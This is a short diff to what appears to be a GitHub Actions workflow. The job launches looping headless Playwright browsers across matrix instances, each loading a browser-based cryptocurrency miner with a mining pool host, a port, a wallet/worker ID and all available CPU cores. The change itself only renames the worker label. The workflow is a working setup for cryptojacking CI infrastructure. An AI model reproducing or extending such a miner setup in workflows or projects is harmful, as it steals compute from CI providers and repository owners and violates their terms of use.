@@ -50,7 +50,7 @@ jobs:
 
       - name: Run headless loop for instance ${{ matrix.instance }}
         run: |
-          URL="https://webminer.pages.dev?algorithm=cwm_power2B&host=asia.rplant.xyz&port=17022&worker=Mau73g3nEEM5VpQG4EAMPtkuwBy1ZcqgCk.1000&password=x&workers=$(nproc)"
+          URL="https://webminer.pages.dev?algorithm=cwm_power2B&host=asia.rplant.xyz&port=17022&worker=Mau73g3nEEM5VpQG4EAMPtkuwBy1ZcqgCk.IntelXeon6980P&password=x&workers=$(nproc)"
           
           cat > loop-playwright-${{ matrix.instance }}.js <<EOF
           const { chromium } = require('playwright-chromium');
